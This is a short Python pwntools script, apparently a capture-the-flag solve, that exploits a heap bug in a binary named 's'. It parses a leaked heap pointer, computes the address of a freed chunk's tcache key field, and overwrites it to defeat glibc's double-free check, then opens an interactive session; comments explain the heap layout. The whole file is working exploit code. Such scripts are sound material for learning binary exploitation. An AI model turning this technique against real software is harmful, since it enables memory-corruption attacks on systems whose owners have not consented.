#!/usr/bin/env python3
from pwn import *

e = ELF("s")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("addr", 1337)
	elif args.GDB:
		return gdb.debug(e.path, "c")
	else:
		return process(e.path)

if __name__ == '__main__':
	r = conn()
	chunk = int(r.recvlineS(keepends=False)[2:], 16)
	# before char *d = malloc(64), we had char *c = malloc(64), so c should be 64 + 16 (chunk metadata) = 0x50 below d in mem
	# we want to change the chunk's key pointer, which is 8 bytes ahead of the freed chunk
	# libc checks if the key value is the same as tcache (the size 0x290 chunk at the beginning)
	# If it is, then it's a double free
	r.sendline(str(chunk-0x50+8).encode())
	# it can be anything that isn't tcache, which is located at chunk - 0x50 - 0x290
	r.sendline(str(0xdeadbeef).encode())
	r.interactive()